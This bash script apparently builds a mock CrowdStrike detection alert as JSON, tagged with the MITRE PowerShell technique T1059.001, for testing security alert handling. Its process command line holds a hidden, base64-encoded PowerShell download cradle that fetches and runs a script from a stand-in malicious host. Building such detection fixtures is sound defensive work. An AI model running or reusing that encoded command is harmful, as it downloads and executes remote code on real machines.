#!/usr/bin/env bash
# PowerShell Encoded Command - Suspicious Activity
# MITRE ATT&CK: T1059.001 - PowerShell
# Tactic: Execution
# Severity: HIGH

SCENARIO_NAME="powershell_encoded"
SCENARIO_SOURCE="crowdstrike"
SCENARIO_SEVERITY="HIGH"
SCENARIO_TACTIC="Execution"
SCENARIO_TECHNIQUE="T1059.001"

TIMESTAMP=$(date +%s)
DETECT_ID="cs-${TIMESTAMP}"

build_payload() {
    local tenant_id="${1:-default-tenant}"
    cat <<EOF
{
    "detect_id": "${DETECT_ID}",
    "customer_id": "${tenant_id}",
    "timestamp": ${TIMESTAMP},
    "sensor": {
        "hostname": "win-workstation-03"
    },
    "process": {
        "user_name": "CORP\\\\jdoe",
        "file_name": "powershell.exe",
        "command_line": "powershell.exe -nop -w hidden -enc SQBFAFgAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALgBzAGkAdABlAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA=",
        "sha256": "fedcba0987654321fedcba0987654321fedcba0987654321fedcba0987654321"
    },
    "tactic": "${SCENARIO_TACTIC}",
    "technique": "${SCENARIO_TECHNIQUE}",
    "severity": "${SCENARIO_SEVERITY}"
}
EOF
}
